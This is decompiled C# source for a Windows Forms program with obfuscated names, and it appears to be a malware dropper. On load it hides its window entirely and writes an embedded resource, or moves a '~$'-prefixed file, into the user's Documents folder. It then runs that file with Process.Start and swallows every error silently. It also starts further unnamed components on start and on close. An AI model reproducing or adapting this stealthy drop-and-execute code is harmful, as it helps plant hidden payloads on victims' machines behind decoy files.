using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using emrdhorausi.Properties;

namespace emrdhorausi;

public class Form1 : Form
{
	private MREDM emrdhorausimainvp = new MREDM();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public void emrdhorausiloadMe()
	{
		try
		{
			if (!(DAONIF.emrdhorausiget_mpath() != Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\"))
			{
				return;
			}
			ARPCON aRPCON = new ARPCON();
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
			string text2 = text + fileNameWithoutExtension + " " + aRPCON.fileExt;
			if (!File.Exists(text2))
			{
				if (Resources.emrdhorausi.Length > 75)
				{
					File.WriteAllBytes(text2, Resources.emrdhorausi);
				}
				else
				{
					emrdhorausiloadOthr(fileNameWithoutExtension, text2);
				}
			}
			if (File.Exists(text2))
			{
				load_file(text2);
			}
		}
		catch
		{
		}
	}

	public void load_file(string fileName)
	{
		try
		{
			Process.Start(fileName);
		}
		catch
		{
		}
	}

	private void emrdhorausiloadOthr(string tFile, string fileName)
	{
		try
		{
			byte[] array = new byte[2] { 126, 36 };
			string @string = Encoding.UTF8.GetString(array, 0, array.Length);
			if (File.Exists(@string + tFile))
			{
				File.Move(@string + tFile, fileName);
			}
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).set_Visible(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			((Form)this).set_ShowIcon(false);
			Application.get_ExecutablePath();
			emrdhorausimainvp.emrdhorausido_start();
			emrdhorausiloadMe();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		emrdhorausimainvp.emrdhorausiload_app();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
